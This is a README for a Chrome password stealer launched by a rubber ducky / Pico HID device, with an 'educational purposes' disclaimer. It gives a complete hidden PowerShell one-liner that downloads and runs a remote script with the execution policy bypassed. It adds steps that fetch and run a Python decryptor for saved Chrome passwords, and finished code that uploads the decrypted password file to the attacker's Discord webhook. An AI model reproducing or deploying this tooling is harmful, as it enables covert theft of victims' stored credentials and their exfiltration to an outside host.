THIS SCRIPT IS ONLY INTENDED FOR EDUCATIONAL PURPOSES
(decrypt script made by ohyicong)

# Dependencies:
- Windows
- Python

# How it Works:

(This code is very unoptimized, but i havent bothered fixing it)

## The rubber ducky script
When the grabber.dd runs it opens a powershell terminal window and enters this string:

```
powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE\Documents\starter.ps1 ; powershell.exe -File .\starter.ps1 -webhookUrl "<Your discord webhook here>""
```

### Flags used:

The ```powershell -w h -NoP -NonI -Exec Bypass -c``` tells powershell to execute a set of commands with some flags:
- ```-w h``` tells powershell to run in a hidden window so the victim cant see logs
- ```-NoP``` makes sure that none of the users profiles are loaded, which could mess up execution
- ```-NonI``` Makes the user unable to interact with the script while its running
- ```-Exec Bypass``` Makes powershell bypass the execution policy which allows powershell to run scripts
- ```-c``` tells powershell what commands to execute, the commands are enclosed in quotes and seperated with semicolons
- Now the script proceecds to execute a sequence of commands

### Commands ran:

1. The first command ran is ```cd $env:USERPROFILE\Documents``` which takes us into the users Documents folder where we will be doing everything
   
2. Next we run ```iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE\Documents\starter.ps1``` which invokes a web request to the github link where the starter.ps1 script is and downloading it, the script is placed in the Documents folder with the -OutFile argument
  
3. Now we run ```powershell.exe -File .\starter.ps1 -webhookUrl "<Your discord webhook here>"``` as our last command. This uses the powershell interpreter to execute the starter.ps1 script and then passes the variable -webhookUrl to the powershell script. This is used for the discord webhook in the script. Dont forget to put your discord webhook there or it wont work.

## The powershell script

The powershell script is used as sort of a base of operations, it downlaods the python password decryptor and sends the file over discord. Heres how it works:

### Extracting the passwords:

To extract the passwords saved in chrome we use a python script made by ohyicong, if you are interested in how it works you can read his [medium article](https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d)

First we tell powershell where python is located on the system so we can use it to execute the script:
```powershell
$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
```
Then we install the needed python libraries, if the user already have the libraries pip will automaticly cancel the installation and the script will proceed wither way.
```powershell
py -m pip install pycryptodomex pywin32
```
Then we download the python script the same way the rubber ducky script downloaded the ```starter.ps1``` scrip:
```powershell
Invoke-WebRequest -Uri https://github.com/simen64/Pico-HID-Scripts/blob/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
```
Now we run the python script using this line. The ```&``` tells powershell to execute a command. The ```$env``` variable is where python is located and the ```$Env``` variable is where the python script is saved from the previous step
```powershell
& $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
```

### Sending the passwords over Discord

This part of the code is what takes the decrypted passwords file and sends it to you over discord. I am not going to explain how this works as i am not good in powershell scripting and shamelessly stole this part of stackoverflow and chatGPT XD.
```powershell

$user = $env:USERNAME

$file = "C:\Users\$user\Documents\decrypted_password.csv"

$message = "Extracted passwords:"

$boundary = [System.Guid]::NewGuid().ToString()

$fileContent = [System.IO.File]::ReadAllBytes($file)

$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"content`"",
    "",
    $message,
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"file.txt`"",
    "Content-Type: application/octet-stream",
    "",
    [System.Text.Encoding]::Default.GetString($fileContent),
    "--$boundary--"
)

$body = $bodyLines -join "`r`n"

$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
```
